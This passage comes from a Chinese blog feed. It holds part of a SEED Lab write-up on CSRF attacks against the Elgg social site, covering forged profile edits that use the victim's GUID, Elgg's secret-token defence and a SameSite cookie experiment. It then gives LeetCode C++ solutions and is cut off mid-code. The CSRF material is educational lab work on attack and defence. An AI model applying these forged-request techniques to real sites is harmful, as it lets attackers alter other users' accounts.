<p>​    如果网站只使用cookie来验证修改主页用户的身份的话，而不对Guid和name等其它字段进行校验的话，是可以对任何用户的资料进行修改的。但是如果网站对Guid或者name等字段进行校验的话，这时候我们就需要修改代码，加入暴力枚举等措施来寻找正确的相应字段，最后也可以进行成功的攻击。</p>
<p>​    针对这个问题，可以做下面的一个实验，首先不对攻击的网页代码进行修改，切换到boby用户来点击攻击者的网页，看是不是boby的网页信息被成功修改。可以从下图中看出javascript程序执行后网页返回undefined，boby的elgg网页则返回no permission，说明攻击没有成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125160842869.png" alt="image-20221125160842869"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125161005123.png" alt="image-20221125161005123"></p>
<p>​    </p>
<p>​    下面将name修改为Boby，guid不变，点击恶意网页，发现和上面情况相同，不能够成功的修改。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125160913083.png" alt="image-20221125160913083"></p>
<p>​    下面我们通过html源代码获取到boby的guid，加入到代码中，重复攻击过程，发现修改成功，可以看出guid在修改网页中充当了验证功能。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125161121341.png" alt="image-20221125161121341"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125161151547.png" alt="image-20221125161151547"></p>
<h3 id="2-5-Task-4：开启-Elgg-的防御措施"><a href="#2-5-Task-4：开启-Elgg-的防御措施" class="headerlink" title="2.5 Task 4：开启 Elgg 的防御措施"></a>2.5 Task 4：开启 Elgg 的防御措施</h3><p>​    为了防御 CSRF 攻击，Web 应用程序可以在其页面中嵌入一个秘密令牌。所有来自页面的请求必须携 带这个令牌，否则它们将被视为跨站请求，和同站请求所拥有的权限不同。攻击者将无法得到这个秘密令 牌，所以他们的请求很容易被识别为跨站请求。</p>
<p>​     Elgg 使用这种秘密令牌方法作为其内置的措施来防御 CSRF 攻击。我们已经禁用了这些防御措施，因 此之前攻击能够成功。Elgg 在请求中嵌入了两个参数 __elgg_ts 和 __elgg_token。这两个参数被添加 到 POST 请求的 HTTP 消息体，以及 HTTP GET 请求的 URL 字符串中。服务器在处理一个请求之前将会先 验证这两个字段。</p>
<p>​    <strong>Task：开启防御措施 </strong></p>
<p>​    打开防御措施，首先要进入 Elgg 容器的/var/www/elgg/vendor/elgg/elgg/ engine/classes/Elgg/Security 文件夹，从 Csrf.php 中删除 return 语句。(这里我们注释掉)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125162828015.png" alt="image-20221125162828015"></p>
<p>​    在测试之前，我们首先要消除之前的攻击结果，取消Alice的好友，并将个人描述里的内容删除，然后我们按照Task 1中的代码进行跨站脚本攻击，可以看到提示下图的错误提示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125163226406.png" alt="image-20221125163226406"></p>
<p>​    加入HTTP URL中的额外token字段，修改代码，发现攻击依然失败。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125163415314.png" alt="image-20221125163415314"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125163447709.png" alt="image-20221125163447709"></p>
<p>​    使用Task 2中修改Alice资料的攻击代码，通过点击恶意网站进行攻击，发现同样失败提示Form is missing token or ts field.当我们发起编辑资料攻击的时候，失败的尝试将导致攻击者的页面被重新加载。这将会再次触发伪造的 POST 请求，从而导致另一次失败的尝试，那么页面又将再次被重新加载，再次触发伪造的 POST 请求。因此我们会看到多个重试信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125163609121.png" alt="image-20221125163609121"></p>
<p><strong>解释为什么攻击者为什么不能在 CSRF 攻击中发送这些秘密令牌； 是什么阻止了他们从网页上发现秘密令牌？</strong></p>
<p>​    我们可以从秘密令牌生成代码中看出，Elgg 的秘密令牌是一个哈希值（MD5 信息摘要），这个哈希值是由该网站上的秘密值（从数据库检索得到）、时间戳、用户会话 ID 和随机生成的会话字符串所共同生成。这些秘密值的信息攻击者并不能获取，因此无法伪造秘密令牌。</p>
<h3 id="2-6-Task-5：测试同站-Cookie-方法"><a href="#2-6-Task-5：测试同站-Cookie-方法" class="headerlink" title="2.6 Task 5：测试同站 Cookie 方法"></a>2.6 Task 5：测试同站 Cookie 方法</h3><p>​    大多数浏览器现在已经实现了一种叫做同站 cookie 的机制，这是一个与 cookie 相关联的属性。当发出请求时，浏览器将检查 cookie 这个属性，并决定是否在跨站请求中附加这个 cookie。当 web 应用程序 认为某个 cookie 不应该被附加到跨站请求中时，可以将 cookie 设置为同站 cookie。例如，可以将会话 ID cookie 标记为同站 cookie，因此没有任何跨站请求可以使用该会话 ID，从而将无法发起 CSRF 攻击。</p>
<p>​    我们将使用www.example32.com网站对这一点进行测试，当访问该网站时，浏览器上会设置三个cookie，分别是：cookie-normal、cookie-lax和cookie-strict。 正如其名称所示，第一个 cookie 只是一个普通的 cookie，第二个和第三个 cookie 是两种不同类型的同站 cookie（Lax 和 Strict）。</p>
<p><strong>请描述你所看到的情况，并解释为什么在某些情况下不发送一些 cookie。</strong></p>
<p>​    首先点击第一个Link可以发现三个cookie都被发送，可以从referer字段看出，这个link是一个同站请求link。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125172518105.png" alt="image-20221125172518105"></p>
<p>​    利用GET请求发送数据，可以看到数据被放在URL中，并且三个cookie都被发送。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125172831541.png" alt="image-20221125172831541"></p>
<p>​    使用POST请求方式，同样三个cookie都被发送。<br><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125172744716.png" alt="image-20221125172744716"></p>
<p>​    打开第二个Link，可以看到没有cookie进行携带，并且从referer字段看出，这里请求来自attacker。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125173038304.png" alt="image-20221125173038304"></p>
<p>​    使用GET请求发送数据，可以看到Lax和normal的cookie被发送。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125172924028.png" alt="image-20221125172924028"></p>
<p>​    使用POST请求进行发送，可以看到只有normal的cookie被发送。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125172949004.png" alt="image-20221125172949004"></p>
<p><strong>下面解释上述现象的原因：</strong></p>
<p>这里SameSite的三个属性控制Cookie的等级</p>
<p>1.Strict</p>
<p>​    Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。但是有可能造成不好的用户体验，点击某个网站对另一个网站的连接，跳转过去总是未登录状态。因此在使用attack进行跨站请求时，strick属性的cookie总不会被携带。</p>
<p>2.Lax</p>
<p>​    Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。因此在使用attack进行跨站请求时，只有GET请求的cookie会被携带。</p>
<p>3.Normal</p>
<p>​    Normal相当于None，不对跨站请求处理，因此在所有跨站请求的报文中都会携带。</p>
<p><img src="image-20221125215517513.png" alt="image-20221125215517513"></p>
<p><strong>根据你的理解，请描述同站 cookies 如何帮助服务器检测一个请求是跨站还是同站请求。</strong></p>
<p>​    对于本题而言，我感觉服务器首先会对cookie的属性进行设置，比如服务器设置了cookie的属性为strict，那么浏览器发送的请求中如果带有这个cookie则是同站请求，如果不带有这个cookie那么就是跨站请求。</p>
<p>​    扩展一点浏览器如何判断是不是同站请求，浏览器一般使用一种Public suffix list的机制：只要两个 URL 的 eTLD+1 相同即可，不需要考虑协议和端口。其中，eTLD 表示有效顶级域名，注册于 Mozilla 维护的公共后缀列表（Public Suffix List）中，例如，.com、.co.uk、.github.io 等。eTLD+1 则表示，有效顶级域名+二级域名，例如 taobao.com 等。</p>
<p>​    也就是说两个域名的公共后缀需要在公共后缀列表里面，如果两个域名的后缀是有效顶级域名，也就是加上一个前面的不同子域名两个域名就属于两个网站，而不是同一网站下面的子域名，这样就不属于同站。</p>
<p><strong>请描述你将如何使用同站 cookie 机制来帮助 Elgg 防御 CSRF 攻击。只需要描述思路，无需实现</strong></p>
<p>​    用户在他们的浏览器上开启同站cookie的机制，这样浏览器就可以根据cookie的属性来确定是不是将cookie加入到跨站请求中。另外elgg服务器应该对不同的cookie设置不同的属性，以满足不同的用途，这样能告诉浏览器是不是这个cookie可以被跨站使用。</p>
<p>ps：</p>
<p>下面是firefox浏览器设置同站cookie的机制，设置<strong><code>network.cookie.sameSite.laxByDefault</code></strong>和<strong><code>network.cookie.sameSite.noneRequiresSecure</code></strong>为true</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125180057444.png" alt="image-20221125180057444"></p>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode(二)</title>
    <url>/2023/02/27/Leetcode2/</url>
    <content><![CDATA[<h2 id="Leetcode-二"><a href="#Leetcode-二" class="headerlink" title="Leetcode(二)"></a>Leetcode(二)</h2><h4 id="1-Pow-x-n"><a href="#1-Pow-x-n" class="headerlink" title="1.Pow(x,n)"></a>1.Pow(x,n)</h4><p>一道分治算法的典型题，学密码学经常用到的快速幂算法.不是最优，但是大概结构是对的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> flag = n&lt;<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> t = <span class="built_in">abs</span>(n);</span><br><span class="line">        <span class="type">double</span> ans;</span><br><span class="line">        <span class="keyword">if</span>(t ==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">double</span> y = <span class="built_in">myPow</span>(x,t/<span class="number">2</span>);</span><br><span class="line">            ans = y*y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">double</span> y= <span class="built_in">myPow</span>(x,t/<span class="number">2</span>);</span><br><span class="line">            ans = x*y*y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>/ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="2-寻找两个正序数组的中位数"><a href="#2-寻找两个正序数组的中位数" class="headerlink" title="2.寻找两个正序数组的中位数"></a>2.寻找两个正序数组的中位数</h4><p>困难，使用二分查找也不是这么简单的事情。学习了几遍，大概知道是怎么排除的一个过程了，实在是有点巧妙.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230227214739549.png" alt="image-20230227214739549"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">getKnumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums1,vector&lt;<span class="type">int</span>&gt;&amp;nums2,<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> index1=<span class="number">0</span>,index2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index1==m)&#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2+k<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(index2==n)&#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1+k<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">min</span>(nums1[index1],nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="type">int</span> newindex1 = <span class="built_in">min</span>(index1+k/<span class="number">2</span><span class="number">-1</span>,m<span class="number">-1</span>);</span><br><span class="line">                <span class="type">int</span> newindex2 = <span class="built_in">min</span>(index2+k/<span class="number">2</span><span class="number">-1</span>,n<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span>(nums1[newindex1]&lt;=nums2[newindex2])&#123;</span><br><span class="line">                    k -= newindex1-index1+<span class="number">1</span>;</span><br><span class="line">                    index1 = newindex1 +<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    k -= newindex2-index2+<span class="number">1</span>;</span><br><span class="line">                    index2 = newindex2+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//本题采用排除元素的方法弄</span></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> total_length = nums1.<span class="built_in">size</span>()+nums2.<span class="built_in">size</span>();<span class="comment">//也就是两个数组的总长度</span></span><br><span class="line">        <span class="keyword">if</span>(total_length%<span class="number">2</span>!=<span class="number">0</span>)<span class="comment">//如果是一个奇数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getKnumber</span>(nums1,nums2,(total_length+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> (<span class="built_in">getKnumber</span>(nums1,nums2,(total_length)/<span class="number">2</span>)+<span class="built_in">getKnumber</span>(nums1,nums2,(total_length)/<span class="number">2</span>+<span class="number">1</span>))/<span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="3-最长回文子串"><a href="#3-最长回文子串" class="headerlink" title="3.最长回文子串"></a>3.最长回文子串</h4><p>对于一个子串而言，如果它是回文串，并且长度大于2，那么将它的首尾两个字母去掉后，它还是一个回文串。可以使用动态规划的思想来解决问题，使用P(i,j)来表示字符串i到j的串是否为回文串 </p>
<p>这里注意在状态转移方程中，我们是从长度比较短的字符串向长度比较长的字符串之间进行转移的，循环顺序比较重要</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//首先对输入进行判断</span></span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> maxlen = <span class="number">1</span>;<span class="comment">//用来存储最大的长</span></span><br><span class="line">        <span class="comment">//动态规划开始，创建一个dp数组</span></span><br><span class="line">        <span class="type">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        <span class="comment">//首先初始化这个dp数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][i]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> L=<span class="number">2</span>;L&lt;=n;L++)&#123;</span><br><span class="line">            <span class="comment">//遍历所有可能的长度</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="type">int</span> j = i+L<span class="number">-1</span>;</span><br><span class="line">                <span class="comment">//判断j是否越界</span></span><br><span class="line">                <span class="keyword">if</span>(j&gt;=n)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i]!=s[j])&#123;</span><br><span class="line">                        dp[i][j]=<span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(j-i&lt;<span class="number">3</span>)</span><br><span class="line">                        dp[i][j]=<span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        dp[i][j]=dp[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(dp[i][j]&amp;&amp;L&gt;maxlen)&#123;</span><br><span class="line">                    maxlen = L;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(begin,maxlen);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="4-二叉树的前序遍历"><a href="#4-二叉树的前序遍历" class="headerlink" title="4.二叉树的前序遍历"></a>4.二叉树的前序遍历</h4><p>这是又到了数据结构的知识上了，还得简单回顾一下。</p>
<p>首先回顾一下树</p>
<ul>
<li>树的一个节点的孩子个数称为该结点的读，树中结点的最大度数称为树的度，例如度大于0的节点称为分支节点，度为0的节点称为叶子节点</li>
</ul>
<p>一些性质</p>
<ol>
<li>树中的结点数等于所有结点的度数之和加1<font color='red'>因为结点的度是结点的孩子个数，根结点是独立的无孩子的结点，因此要加1</font></li>
<li>度为m的树中第i层上至多有$m^{i-1}$个结点.<font color='blue'>m是树的度，也就是说树中孩子结点的最大数量是m</font></li>
<li>高度：高度是从叶子结点往根节点数，高度为h的m叉树之多有$(m^h-1)/(m-1)$个结点</li>
<li>具有n个节点的m叉树的最小高度为可以由上面的式子推导</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">preT</span><span class="params">(TreeNode* root,vector&lt;<span class="type">int</span>&gt;&amp; order)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            order.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            <span class="built_in">preT</span>(root-&gt;left,order);</span><br><span class="line">            <span class="built_in">preT</span>(root-&gt;right,order);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; order;</span><br><span class="line">        <span class="built_in">preT</span>(root,order);</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="5-二叉树的中序遍历"><a href="#5-二叉树的中序遍历" class="headerlink" title="5.二叉树的中序遍历"></a>5.二叉树的中序遍历</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">MidT</span><span class="params">(TreeNode* root,vector&lt;<span class="type">int</span>&gt;&amp; order)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">MidT</span>(root-&gt;left,order);</span><br><span class="line">            order.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            <span class="built_in">MidT</span>(root-&gt;right,order);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//现在是中序遍历，还是使用全局变量</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; order;</span><br><span class="line">        <span class="built_in">MidT</span>(root,order);</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="6-二叉树的后序遍历"><a href="#6-二叉树的后序遍历" class="headerlink" title="6.二叉树的后序遍历"></a>6.二叉树的后序遍历</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">lastT</span><span class="params">(TreeNode* root,vector&lt;<span class="type">int</span>&gt;&amp; order)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="built_in">lastT</span>(root-&gt;left,order);</span><br><span class="line">        <span class="built_in">lastT</span>(root-&gt;right,order);</span><br><span class="line">        order.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; order;</span><br><span class="line">        <span class="built_in">lastT</span>(root,order);</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="7-盛最多水的容器"><a href="#7-盛最多水的容器" class="headerlink" title="7.盛最多水的容器"></a>7.盛最多水的容器</h4><p>采用双指针解决的一道问题，也就是每次我们移动数值比较小的那个指针，因为移动这个指针，水的容量可能会增加。如果移动那个比较大的指针，那么容量一定会减少</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> r = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">            <span class="type">int</span> k = <span class="built_in">min</span>(height[l],height[r]);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,k*(r-l));</span><br><span class="line">            <span class="keyword">if</span>(height[l]&lt;=height[r])&#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="8-大数加法"><a href="#8-大数加法" class="headerlink" title="8.大数加法"></a>8.大数加法</h4><p>经典问题，当时一开始学习C++就是这个问题，关键在于能手动模拟一下加法的过程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">(<span class="number">720</span>)<span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两个字符串相加，模拟手算。两个字符串只有数字，没有符号</span></span><br><span class="line"><span class="function">string <span class="title">addString</span><span class="params">(string str1,string str2)</span></span>&#123;</span><br><span class="line">    string res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> pos1=str1.<span class="built_in">size</span>()<span class="number">-1</span>, pos2=str2.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> C=<span class="number">0</span>, num1=<span class="number">0</span>, num2=<span class="number">0</span>, sum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 从后向前逐个相加。</span></span><br><span class="line">    <span class="keyword">for</span>(;pos1&gt;=<span class="number">0</span>||pos2&gt;=<span class="number">0</span>; pos1--, pos2--)&#123;</span><br><span class="line">        num1=pos1&gt;=<span class="number">0</span>? str1[pos1]-<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>;</span><br><span class="line">        num2=pos2&gt;=<span class="number">0</span>? str2[pos2]-<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>;</span><br><span class="line">        sum=num1+num2+C;</span><br><span class="line">        res= <span class="built_in">to_string</span>(sum%<span class="number">10</span>) + res;</span><br><span class="line">        C=sum/<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(C)&#123;</span><br><span class="line">        res= <span class="built_in">to_string</span>(C)+res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 